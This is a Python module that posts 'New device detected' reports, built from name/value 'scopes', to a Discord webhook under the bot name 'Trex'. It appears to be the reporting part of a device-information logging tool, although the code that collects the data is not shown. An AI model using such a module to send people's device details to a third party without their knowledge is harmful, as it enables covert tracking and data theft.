from binder import Binder
import requests

class DiscordWebhookBinder(Binder):

    def __init__(self, webhook_url, username="Trex", avatar_url="https://cdn-icons-png.flaticon.com/512/2313/2313448.png"):
        self.webhook_url = webhook_url
        self.username = username
        self.avatar_url = avatar_url

    def _generate_payload_content(self, scopes):
        out = "**New device detected:**\n"
        for scope in scopes:
            out += "**" + scope["name"] + ":** " + scope["value"] + "\n"
        if len(out) > 1000:
            # divide into multiple messages and return as array
            return out.split("\n")
        return [out]

    def _generate_payload(self, scopes):
        out = []
        content = self._generate_payload_content(scopes)
        for c in content:
            out.append({
                'username': self.username,
                'avatar_url': self.avatar_url,
                'content': c
            })
        return out

    def send(self, scopes):
        payloads = self._generate_payload(scopes)
        for payload in payloads:
            requests.post(self.webhook_url, json=payload)